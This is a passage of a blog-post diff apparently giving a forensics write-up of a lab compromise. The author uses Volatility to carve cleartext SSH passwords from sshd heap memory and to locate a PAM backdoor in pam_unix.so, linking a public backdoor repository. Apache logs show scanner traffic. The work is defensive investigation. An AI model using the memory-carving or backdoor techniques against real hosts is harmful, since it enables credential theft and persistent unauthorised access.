+real_odie # zip Odie_profile.zip /usr/src/volatility-tools/linux/module.dwarf /boot/System.map-4.9.0-8-amd64
+  adding: usr/src/volatility-tools/linux/module.dwarf (deflated 91%)
+  adding: boot/System.map-4.9.0-8-amd64 (deflated 79%)
+</code></pre>
+
+<p>All we have to do now is import the new profile wherever we want. In order to use it with Volatility. Personally I made a little docker for volatility: <a href="https://gitlab.com/Maki_chaz/infosec-docker/tree/master/forensic/volatility">https://gitlab.com/Maki_chaz/infosec-docker/tree/master/forensic/volatility</a></p>
+
+<pre><code class="language-bash">$ sudo docker run --rm --name volatility -v /home/maki/Tools/plugin_vol:/opt/plug_vol -v ${PWD}:/opt/usr_land -ti volatility
+$ vol.py --plugins=plug_vol/ --info | grep Odie
+Volatility Foundation Volatility Framework 2.6.1
+LinuxOdie_profilex64            - A Profile for Linux Odie_profile x64
+$ vol.py --plugins=plug_vol/ --profile=LinuxOdie_profilex64 -f usr_land/memory.dmp linux_banner
+Volatility Foundation Volatility Framework 2.6.1
+Linux version 4.9.0-8-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.130-2 (2018-10-27)
+</code></pre>
+
+<p>Everything is finally ready for the analysis! You can download archives below:</p>
+
+<table>
+<thead>
+<tr>
+<th>Fichier</th>
+<th>MD5</th>
+<th>Lien</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>memory.tar.gz</td>
+<td>ff2d570749e019e00448fc83412ceeb1</td>
+<td><a href="https://mega.nz/#!3LA3nQQQ!-2JIOVfsajxS-OPjERK4SEyWetSjyOiyWuPYkiXkqWU">https://mega.nz/#!3LA3nQQQ!-2JIOVfsajxS-OPjERK4SEyWetSjyOiyWuPYkiXkqWU</a></td>
+</tr>
+
+<tr>
+<td>Odie_profile.zip</td>
+<td>61ab07058a0a66046ad085f0973b1543</td>
+<td><a href="https://mega.nz/#!iXgTFazJ!x8w6eZaUcju1Le89nkUMLkSegQe3CD5sJeX8okuoBt8">https://mega.nz/#!iXgTFazJ!x8w6eZaUcju1Le89nkUMLkSegQe3CD5sJeX8okuoBt8</a></td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="dfir-time">DFIR time</h2>
+
+<p>Finally, the expect moment: the treasure hunt! Odie intends to investigate this mysterious connection. Fortunately, he has been cyberdefense courses at ENSIBS to help him in this task.</p>
+
+<h3 id="malicious-connection">Malicious connection</h3>
+
+<p>So, obviously a suspicious IP is connected:</p>
+
+<blockquote>
+<p>192.168.122.158</p>
+</blockquote>
+
+<pre><code class="language-bash">$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_netstat &gt; pnetstat
+$ cat pnetstat | grep '192.168.122.158'
+TCP      192.168.122.216 :   22 192.168.122.158 :36736 ESTABLISHED                  sshd/22335
+TCP      192.168.122.216 :   22 192.168.122.158 :36736 ESTABLISHED                  sshd/22341
+</code></pre>
+
+<p>These connections come from SSH. Let&rsquo;s see how processes are arranged:</p>
+
+<pre><code class="language-bash">$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_pstree &gt; ppstree
+$ cat ppstree
+Name                 Pid             Uid            
+systemd              1                              
+.systemd-journal     193                            
+.systemd-udevd       216                            
+.systemd-timesyn     289             100            
+.rsyslogd            324                            
+.dbus-daemon         326             105            
+.cron                343                            
+.systemd-logind      344                            
+.agetty              371                            
+.sshd                374                            
+..sshd               409                            
+...sshd              418             1000           
+....bash             419             1000           
+.....sudo            22887                          
+......insmod         22888                          
+..sshd               22335                          
+...sshd              22341           1000           
+....bash             22342           1000           
+.....sudo            22347                          
+......su             22348                          
+.......bash          22349                          
+.dhclient            393                            
+.systemd             411             1000           
+..(sd-pam)           412             1000           
+.packagekitd         14659                          
+.polkitd             14670                          
+.containerd          16169                          
+.dockerd             16290                          
+.apache2             21462                          
+..apache2            21463           33             
+..apache2            21464           33             
+..apache2            21466           33             
+..apache2            21467           33             
+..apache2            21589           33             
+..apache2            21731           33             
+..apache2            21732           33             
+..apache2            21733           33             
+..apache2            21734           33             
+..apache2            21735           33             
+.mysqld              21557           107            
+[...]
+</code></pre>
+
+<p>Processes <code>22341</code> and <code>22335</code> are executes by the IUD 1000, in other words, the user <strong>odie</strong>. It&rsquo;s quite surprising.</p>
+
+<p>The attacker has been logged in legitimately. If the hacker would abuse a binary, the parent would be this binary and not a legit service (like ssh). In our case, it&rsquo;s considered as a legit connection for the system, there are two possibilities:</p>
+
+<ul>
+<li>The attacker found the <strong>odie</strong>&rsquo;s password ;</li>
+<li>The attacker implemented a backdoor.</li>
+</ul>
+
+<p>Odie knows his session password, it&rsquo;s easy to search it in memory using <code>yarascan</code> plugin from Volatility:</p>
+
+<pre><code class="language-bash">$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_yarascan -Y &quot;1r0nm41d3n!&quot;
+[...]
+Task: sshd pid 418 rule r1 addr 0x55f43e6dd646
+0x55f43e6dd646  31 72 30 6e 6d 34 31 64 33 6e 21 0d 6c 73 20 2d   1r0nm41d3n!.ls.-
+0x55f43e6dd656  6c 61 0d 73 75 64 6f 20 73 75 0d 1b 5b 41 1b 5b   la.sudo.su..[A.[
+0x55f43e6dd666  41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41   A.[A.[A.[A.[A.[A
+0x55f43e6dd676  1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b   .[A.[A.[A.[A.[A.
+0x55f43e6dd686  5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b   [A.[A.[A.[A.[A.[
+0x55f43e6dd696  41 1b 5b 41 1b 5b 41 1b 5b 42 1b 5b 42 1b 5b 41   A.[A.[A.[B.[B.[A
+0x55f43e6dd6a6  0d 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41   ..[A.[A.[A.[A.[A
+0x55f43e6dd6b6  1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b   .[A.[A.[A.[A.[A.
+0x55f43e6dd6c6  5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b   [A.[A.[A.[A.[A.[
+0x55f43e6dd6d6  41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 41 1b 5b 42   A.[A.[A.[A.[A.[B
+0x55f43e6dd6e6  0d 73 79 73 74 65 6d 63 74 20 7f 6c 20 72 65 73   .systemct..l.res
+0x55f43e6dd6f6  74 61 72 74 20 61 70 7f 61 7f 70 61 63 65 68 32   tart.ap.a.paceh2
+0x55f43e6dd706  7f 7f 7f 68 65 32 0d 1b 5b 41 1b 7f 6d 61 72 69   ...he2..[A..mari
+0x55f43e6dd716  61 64 62 0d 65 78 69 74 0d 70 69 6e 67 20 67 6f   adb.exit.ping.go
+0x55f43e6dd726  6f 67 6c 65 2e 66 72 0d 03 6c 73 20 2d 6c 61 20   ogle.fr..ls.-la.
+0x55f43e6dd736  2f 75 73 09 6c 6f 09 62 69 09 09 0d 73 73 68 2d   /us.lo.bi...ssh-
+</code></pre>
+
+<p>Interesting, this string appears many times in memory. In <code>sshd</code> process. Let&rsquo;s locate exactly where:</p>
+
+<pre><code class="language-bash">$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_proc_maps -p 418
+Volatility Foundation Volatility Framework 2.6.1
+Offset             Pid      Name                 Start              End                Flags               Pgoff Major  Minor  Inode      File Path
+------------------ -------- -------------------- ------------------ ------------------ ------ ------------------ ------ ------ ---------- ---------
+0xffff9796b895e040      418 sshd                 0x000055f43d7d3000 0x000055f43d890000 r-x                   0x0    254      1     143894 /usr/sbin/sshd
+0xffff9796b895e040      418 sshd                 0x000055f43da90000 0x000055f43da93000 r--               0xbd000    254      1     143894 /usr/sbin/sshd
+0xffff9796b895e040      418 sshd                 0x000055f43da93000 0x000055f43da94000 rw-               0xc0000    254      1     143894 /usr/sbin/sshd
+0xffff9796b895e040      418 sshd                 0x000055f43da94000 0x000055f43da9d000 rw-                   0x0      0      0          0 
+0xffff9796b895e040      418 sshd                 0x000055f43e6b6000 0x000055f43e6fb000 rw-                   0x0      0      0          0 [heap]
+[...]
+</code></pre>
+
+<p>The password has been found at the address <code>0x55f43e6dd646</code>. The sshd heap owns this address (<code>0x000055f43e6b6000</code> - <code>0x000055f43e6fb000</code>). Let&rsquo;s extract the heap:</p>
+
+<pre><code class="language-bash">$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_dump_map -s 0x000055f43e6b6000 -p 418 -D .
+Volatility Foundation Volatility Framework 2.6.1
+Task       VM Start           VM End                         Length Path
+---------- ------------------ ------------------ ------------------ ----
+       418 0x000055f43e6b6000 0x000055f43e6fb000            0x45000 ./task.418.0x55f43e6b6000.vma
+
+$ strings task.418.0x55f43e6b6000.vma | less 
+[lot of useful data]
+
+$ strings task.418.0x55f43e6b6000.vma | grep -C 3 &quot;sudo&quot; 
+0Em&gt;
+sb_release -cs) \
+   stable&quot;
+sudo apt-get update &amp;&amp; sudo apt-get install docker-ce
+sudo usermod -aG docker odie
+i pa
+ip a
+apt install python
+--
+[2;2R
+]11;rgb:0000/0000/2c2c
+[&gt;65;5403;1ciT
+sudo apt install mariadb-client mariadb-server
+1r0nm41d3n!
+sud su
+o su
+
+</code></pre>
+
+<p>I realize that there are many interesting things stored in the heap:</p>
+
+<ul>
+<li>Environment variables</li>
+<li>Clear session password and hash</li>
+<li>Executed commands</li>
+</ul>
+
+<p>Really instructive, let&rsquo;s do the same operation on the suspicious <code>sshd</code> process, the PID <code>22341</code>.</p>
+
+<pre><code class="language-bash">$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_proc_maps -p 22341 | grep heap
+Volatility Foundation Volatility Framework 2.6.1
+0xffff9796bab09040    22341 sshd                 0x0000556477825000 0x0000556477862000 rw-                   0x0      0      0          0 [heap]
+
+$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_dump_map -s 0x0000556477825000 -p 22341 -D .
+Volatility Foundation Volatility Framework 2.6.1
+Task       VM Start           VM End                         Length Path
+---------- ------------------ ------------------ ------------------ ----
+     22341 0x0000556477825000 0x0000556477862000            0x3d000 ./task.22341.0x556477825000.vma
+</code></pre>
+
+<p>When the sshd heap is successfully extracted, I&rsquo;m looking for this string: <code>sudo</code>. Each time sudo is called, it asks for your password:</p>
+
+<pre><code class="language-bash">$ strings task.22341.0x556477825000.vma | grep -C 3 &quot;sudo&quot;
+odie
+(	To+
+sshd
+sudo su
+PlopPlop1337
+odie
+zV%0
+[...]
+</code></pre>
+
+<p>What a surprise, the string <code>PlopPlop1337</code> is really strange. This string does not appear in the heap of the legit sshd process. The backdoor hypothesis becomes a reality.</p>
+
+<p>We have barely made this discovery that Odie wants to try to log on with these credentials:</p>
+
+<blockquote>
+<p>Odie : PlopPlop1337</p>
+</blockquote>
+
+<p>He realizes with amazement that it works! It seems that a backdoor has been installed! Questions are: where it is and how did it come here?</p>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/blue_2.gif" alt="" />
+</center></p>
+
+<p>After a few research on the internet, I fell on PAM mechanism and a great GitHub for backdoor creation: <a href="https://github.com/zephrax/linux-pam-backdoor">https://github.com/zephrax/linux-pam-backdoor</a></p>
+
+<p>If we follow the GitHub carefully, the file containing the backdoor should be the <code>pam_unix.so</code> library.</p>
+
+<pre><code class="language-bash">$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_find_file -L &gt; pfile_list
+$ cat pfile_list| grep 'pam_unix.so'
+          406506 0xffff97969858f128 /bin/bin/lib/x86_64-linux-gnu/security/pam_unix.so
+          393641 0xffff97967660c228 /bin/bin/lib/x86_64-linux-gnu/security/pam_unix.so.bak
+</code></pre>
+
+<p>Well, well, well. Fortunately, our friend the hacker is a nice man, he has created a backup for us :D
+Let&rsquo;s extract these files the <em>bak</em>  should be the real library and the other the backdoor.</p>
+
+<pre><code class="language-bash">$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_find_file -i 0xffff97969858f128 -O pam_unix.so
+$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_find_file -i 0xffff97967660c228 -O pam_unix.so.swp
+$ md5sum pam_unix.so*
+bdeb3146f66059b44c03522414497e2a  pam_unix.so
+3f6a3cec7fc05d66d269d10614e4c20b  pam_unix.so.swp
+</code></pre>
+
+<p>It&rsquo;s true, doing md5 comparaison between two files extracted from memory is not really relevent. Who knows, it could have been useful.
+After a brief analysis of their strings, <code>PlopPlop1337</code> is found in <code>pam_unix.so</code> library. It is true, we have located the backdoor! Champagne!</p>
+
+<p>Another string caught my attention:</p>
+
+<pre><code class="language-bash">$ strings pam_unix.so | less
+[...]
+libc.so.6
+pam_unix.so
+/home/monique/T
+chargements/ironmaiden/linux-pam-backdoor-master/Linux-PAM-1.1.8/libpam/.libs:/lib64
+GLIBC_2.2.5
+LIBPAM_EXTENSION_1.0
+[...]
+</code></pre>
+
+<p>Obviously, the bad hacker is called <code>Monique</code>! This string is here because the bad girl compiled the PAM backdoor on her machine and not on Odie&rsquo;s web server.</p>
+
+<p>There are several things to consider:</p>
+
+<ul>
+<li>If there is a PAM backdoor, then Monique got <strong>root</strong> rights ;</li>
+<li>On a web server, the entrypoint must be the website ;</li>
+<li>Even if the web site got pwned, Monique did one or more privilege escalation.</li>
+</ul>
+
+<h3 id="entrypoint">Entrypoint</h3>
+
+<p>Ok, me and Odie found the backdoor. But if we remove it without finding the entry point, then Monique will be able to install her backdoor again and again, without any problems.</p>
+
+<p>Let&rsquo;s focus on the web server. First of all, finding Apache2 logs:</p>
+
+<pre><code class="language-bash">$ cat pfile_list| grep '/var/log/apache2'
+          529847 0xffff9796ba37d228 /bin/bin/var/log/apache2
+          530134 0xffff9796b95a23e8 /bin/bin/var/log/apache2/access.log.swp
+          530135 0xffff9796b954b698 /bin/bin/var/log/apache2/other_vhosts_access.log
+          530133 0xffff9796b95a2c48 /bin/bin/var/log/apache2/error.log
+</code></pre>
+
+<p>Monique must be a really nice girl. She did backups before removing something. Or she is just a bit stupid and don&rsquo;t know how to really clean her traces :D</p>
+
+<p><center>
+<img src="https://media.giphy.com/media/33iqmp5ATXT5m/giphy.gif" alt="" />
+</center></p>
+
+<pre><code class="language-bash">$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_find_file -i 0xffff9796b95a23e8 -O access.log.swp
+$ cat access.log.swp | grep 158 | ccze -A | less -I
+</code></pre>
+
+<p>Pro tip: when you have to read large Apache2 logs, and you don&rsquo;t have super cyber SIEM 4.0, you got <code>ccze</code>. It will colorize the output and will gives this result:</p>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/blue_3.png" alt="" />
+</center></p>
+
+<p>Odie sees a beautiful little <em>User-Agent</em>: <code>DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)</code></p>
+
+<p><code>DirBuster</code> is a Java tool provided by OWASP, it allows a pentester to bruteforce filenames and directories of a web server according to preset wordlist.</p>
+
+<p>Monique IP address tried to find filenames and directories with this tool. Let&rsquo;s count together most visited web pages:</p>
+
+<pre><code class="language-bash">$ cat access.log.swp | awk '{print $7}' | sort | uniq -c | grep -v ' 1 '
+    11 /
+      5 /favicon.ico
+      2 /icons/
+      4 /index.php
+      2 /index.php/2018/12/27/eddie-the-head/
+      6 /test.php
+     23 /wp-admin/admin-ajax.php
+      2 /wp-admin/js/media-upload.min.js?ver=5.0.2
+      3 /wp-admin/themes.php
+      2 /wp-content/
+     12 /wp-content/themes/my-music-band/assets/css/font-awesome/css/blocks.css?ver=1.0
+      2 /wp-content/themes/my-music-band/assets/css/font-awesome/css/font-awesome.css
+     10 /wp-content/themes/my-music-band/assets/css/font-awesome/css/font-awesome.css?ver=4.7.0
+      6 /wp-content/themes/my-music-band/assets/css/font-awesome/fonts/fontawesome-webfont.woff2?v=4.7.0
+      2 /wp-content/themes/my-music-band/assets/js/customize-preview.min.js?ver=20180103
+     10 /wp-content/themes/my-music-band/assets/js/fitvids.min.js?ver=1.1
+     10 /wp-content/themes/my-music-band/assets/js/functions.min.js?ver=201800703
+     10 /wp-content/themes/my-music-band/assets/js/skip-link-focus-fix.min.js?ver=201800703
+      2 /wp-content/themes/my-music-band/inc/metabox/metabox.js?ver=20180103
+      2 /wp-content/themes/my-music-band/screenshot.png
+     10 /wp-content/themes/my-music-band/style.css?ver=5.0.2
+      2 /wp-content/themes/rock-band/assets/images/header-image.jpg
+      2 /wp-content/themes/rock-band/screenshot.png
+     10 /wp-content/themes/rock-band/style.css?ver=5.0.2
+     10 /wp-content/uploads/2018/12/ironmaiden_band.jpg
+      5 /wp-content/uploads/2018/12/ironmaiden_eddie.jpg
+      3 /wp-includes/css/dist/block-library/style.min.css?ver=5.0.2
+      3 /wp-includes/css/dist/block-library/theme.min.css?ver=5.0.2
+      2 /wp-includes/fonts/dashicons.eot
+      2 /wp-includes/js/customize-base.min.js?ver=5.0.2
+      3 /wp-includes/js/jquery/jquery.js?ver=1.12.4
+      3 /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1
+      2 /wp-includes/js/tinymce/plugins/compat3x/plugin.min.js?ver=4800-20180716
+      2 /wp-includes/js/tinymce/tinymce.min.js?ver=4800-20180716
+      2 /wp-includes/js/underscore.min.js?ver=1.8.3
+      3 /wp-includes/js/wp-a11y.min.js?ver=5.0.2
+      3 /wp-includes/js/wp-embed.min.js?ver=5.0.2
+      3 /wp-includes/js/wp-emoji-release.min.js?ver=5.0.2
+      4 /wp-login.php
+</code></pre>
+
+<p>Now, let&rsquo;s exclude WordPress files, they really seem to be legit and up to date (for the moment). And let me add some displayed data:</p>
+
+<pre><code class="language-bash">$ cat access.log.swp | awk '{print $1 $6 $7}' | sort | uniq -c | grep -v 'wp' | grep -v ' 1 '   
+      2 127.0.0.1&quot;GET/test.php
+      3 192.168.122.158&quot;GET/
+      2 192.168.122.158&quot;GET/favicon.ico
+      3 192.168.122.158&quot;HEAD/
+      5 192.168.122.1&quot;GET/
+      3 192.168.122.1&quot;GET/favicon.ico
+      2 192.168.122.1&quot;GET/index.php/2018/12/27/eddie-the-head/
+      3 192.168.122.1&quot;POST/test.php
+</code></pre>
+
+<p>The IPs for <code>test.php</code> do not seem to come from Monique. However, the apache log file seems to be truncated:</p>
+
+<pre><code class="language-bash">$ cat access.log.swp| tail -n 4                            
+192.168.122.158 - - [27/Dec/2018:19:50:32 +0100] &quot;HEAD /traffic.php HTTP/1.1&quot; 404 140 &quot;-&quot; &quot;DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)&quot;
+192.168.122.158 - - [27/Dec/2018:19:50:32 +0100] &quot;HEAD /thumbs.php HTTP/1.1&quot; 404 140 &quot;-&quot; &quot;DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)&quot;
+192.168.122.158 - - [27/Dec/2018:19:50:32 +0100] &quot;HEAD /65.php HTTP/1.1&quot; 404 140 &quot;-&quot; &quot;DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)&quot;
+192.168.122.158 - - [27/Dec/2018:19:50:32 +0100] &quot;HEAD /topic/ HTTP/1.1&quot; 404 140 &quot;-&quot; &quot;DirBuster-1.0-RC1 (http://%
+</code></pre>
+
+<p>Unfortunately, there is no <code>.bash_history</code> for the user <strong>www-data</strong>. We have to find another way to find out what Monique did with this site.</p>
+
+<p>After searching for several hours, Odie reminds me that he still has access to his VPS, let&rsquo;s see what we can get from it. If there is any additional information in the VPS log files:</p>
+
+<pre><code class="language-bash">webserver $ cat ../auth.log | grep 158
+Dec 27 19:58:33 webserver sshd[21592]: Did not receive identification string from 192.168.122.158 port 35782
+Dec 27 21:17:03 webserver sshd[21871]: Connection closed by 192.168.122.158 port 36434 [preauth]
+[...]
+Dec 27 21:49:51 webserver sshd[22149]: Disconnected from 192.168.122.158 port 36538
+Dec 27 22:23:44 webserver sshd[22335]: Accepted password for odie from 192.168.122.158 port 36736 ssh2
+Dec 28 00:52:47 webserver sshd[24179]: Accepted password for odie from 192.168.122.158 port 37392 ssh2
+
+</code></pre>
+
+<p>The first connection seems to have been established the <code>27/12 at 19:58:33</code> and the last the <code>28/12 at 00:52:47</code>. The last connection is the one that appears during Odie&rsquo;s <code>ss</code>.</p>
+
+<p>If I apply a filter on the first schedule in Apache2 logs, <code>access.log</code>, we can get interesting things:</p>
+
+<pre><code class="language-bash">webserver $ cat access.log | grep &quot;19:58&quot;
+192.168.122.158 - - [27/Dec/2018:19:58:39 +0100] &quot;GET / HTTP/1.0&quot; 200 17847 &quot;-&quot; &quot;-&quot;
+192.168.122.158 - - [27/Dec/2018:19:58:40 +0100] &quot;POST /sdk HTTP/1.1&quot; 404 462 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;
+192.168.122.158 - - [27/Dec/2018:19:58:40 +0100] &quot;GET /nmaplowercheck1545937121 HTTP/1.1&quot; 404 483 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;
+192.168.122.158 - - [27/Dec/2018:19:58:40 +0100] &quot;GET /evox/about HTTP/1.1&quot; 404 469 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;
+192.168.122.158 - - [27/Dec/2018:19:58:40 +0100] &quot;GET /HNAP1 HTTP/1.1&quot; 404 464 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;
+192.168.122.158 - - [27/Dec/2018:19:58:40 +0100] &quot;GET / HTTP/1.0&quot; 200 17847 &quot;-&quot; &quot;-&quot;
+192.168.122.158 - - [27/Dec/2018:19:58:40 +0100] &quot;GET / HTTP/1.1&quot; 200 17095 &quot;-&quot; &quot;-&quot;
+192.168.122.158 - - [27/Dec/2018:19:58:58 +0100] &quot;POST /test.php HTTP/1.1&quot; 200 927 &quot;http://192.168.122.216/test.php&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:58:58 +0100] &quot;GET /favicon.ico HTTP/1.1&quot; 404 506 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+
+webserver $ cat access.log | grep &quot;19:58&quot; | grep -v 'Nmap'
+192.168.122.158 - - [27/Dec/2018:19:58:39 +0100] &quot;GET / HTTP/1.0&quot; 200 17847 &quot;-&quot; &quot;-&quot;
+192.168.122.158 - - [27/Dec/2018:19:58:40 +0100] &quot;GET / HTTP/1.0&quot; 200 17847 &quot;-&quot; &quot;-&quot;
+192.168.122.158 - - [27/Dec/2018:19:58:40 +0100] &quot;GET / HTTP/1.1&quot; 200 17095 &quot;-&quot; &quot;-&quot;
+192.168.122.158 - - [27/Dec/2018:19:58:58 +0100] &quot;POST /test.php HTTP/1.1&quot; 200 927 &quot;http://192.168.122.216/test.php&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:58:58 +0100] &quot;GET /favicon.ico HTTP/1.1&quot; 404 506 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+</code></pre>
+
+<p>As we can see, <code>test.php</code> file was called in the same minute, but it&rsquo;s a POST request, with a standard User-Agent. The attacker probably wanted to test something.</p>
+
+<p>In filtering on &ldquo;158&rdquo; (Monique IP address suffix), &ldquo;test.php&rdquo; and removing all garbage request due to Nmap and DirBuster, we can find this:</p>
+
+<pre><code class="language-bash">webserver $ cat access.log | grep 158 | grep -A 4 test.php | grep -v -E &quot;DirBuster|Nmap&quot;
+192.168.122.158 - - [27/Dec/2018:19:50:43 +0100] &quot;GET /test.php HTTP/1.1&quot; 200 415 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:50:43 +0100] &quot;GET /favicon.ico HTTP/1.1&quot; 404 506 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:50:51 +0100] &quot;POST /test.php HTTP/1.1&quot; 200 445 &quot;http://192.168.122.216/test.php&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:50:51 +0100] &quot;GET /favicon.ico HTTP/1.1&quot; 404 506 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:51:00 +0100] &quot;POST /test.php HTTP/1.1&quot; 200 437 &quot;http://192.168.122.216/test.php&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:51:00 +0100] &quot;GET /favicon.ico HTTP/1.1&quot; 404 506 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:51:07 +0100] &quot;POST /test.php HTTP/1.1&quot; 200 442 &quot;http://192.168.122.216/test.php&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:51:07 +0100] &quot;GET /favicon.ico HTTP/1.1&quot; 404 506 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:51:17 +0100] &quot;POST /test.php HTTP/1.1&quot; 200 447 &quot;http://192.168.122.216/test.php&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:51:17 +0100] &quot;GET /favicon.ico HTTP/1.1&quot; 404 506 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:51:32 +0100] &quot;POST /test.php HTTP/1.1&quot; 200 600 &quot;http://192.168.122.216/test.php&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:51:32 +0100] &quot;GET /favicon.ico HTTP/1.1&quot; 404 506 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:51:40 +0100] &quot;POST /test.php HTTP/1.1&quot; 200 443 &quot;http://192.168.122.216/test.php&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:51:40 +0100] &quot;GET /favicon.ico HTTP/1.1&quot; 404 506 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:51:53 +0100] &quot;POST /test.php HTTP/1.1&quot; 200 437 &quot;http://192.168.122.216/test.php&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:51:54 +0100] &quot;GET /favicon.ico HTTP/1.1&quot; 404 506 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:57:32 +0100] &quot;POST /test.php HTTP/1.1&quot; 200 434 &quot;http://192.168.122.216/test.php&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:57:32 +0100] &quot;GET /favicon.ico HTTP/1.1&quot; 404 506 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:57:38 +0100] &quot;POST /test.php HTTP/1.1&quot; 200 2076 &quot;http://192.168.122.216/test.php&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:57:38 +0100] &quot;GET /favicon.ico HTTP/1.1&quot; 404 506 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
